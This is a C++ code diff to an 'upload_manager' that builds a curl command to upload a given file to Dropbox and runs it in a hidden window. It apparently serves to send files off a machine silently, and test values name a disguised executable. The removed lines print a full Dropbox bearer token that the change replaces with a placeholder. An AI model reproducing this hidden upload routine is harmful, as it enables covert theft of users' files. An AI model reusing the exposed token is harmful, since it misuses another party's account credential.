@@ -45,7 +45,6 @@ void upload_manager::start(string file_path) {
     ShExecInfo.nShow = SW_HIDE;
 
     ShExecInfo.hInstApp = NULL;
-
     ShellExecuteEx(&ShExecInfo);
     WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
 
@@ -53,16 +52,9 @@ void upload_manager::start(string file_path) {
 
 string upload_manager::prepare_string(string file_name, string file_path) {
     string res_command = " -X POST https://content.dropboxapi.com/2/files/upload "
-                         "--header \"Authorization: Bearer wO-OKXR2pZAAAAAAAAAAEO5hiDcFqdWDVCGX1R7jJBKR-Gj3koTd3Xob2jkq55dV\""
+                         "--header \"Authorization: Bearer your ak\""
                          " --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/willbereplace_1\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,"
 		"\\\"mute\\\": false,\\\"strict_conflict\\\": false}\" --header \"Content-Type: application/octet-stream\" --data-binary @willbereplace_2";
-		
-		
-		
-		//" -X POST https://content.dropboxapi.com/2/files/upload "
-  //                       "--header \"Authorization: Bearer wO-OKXR2pZAAAAAAAAAAEO5hiDcFqdWDVCGX1R7jJBKR-Gj3koTd3Xob2jkq55dV\""
-  //                       " --header \"Dropbox - API - Arg : {\"path\": \"/willbereplace_1\",\"mode\": \"add\",\"autorename\": true,"
-  //                       "\"mute\": false,\"strict_conflict\": false}\" --header \"Content-Type: application/octet-stream\" --data - binary @willbereplace_2";
 
     //string file_name = "2s3523zxcvxczvzxc5.exe";
     //string file_path = "E:/www.dropbox.com/developers/documentation.EXE";
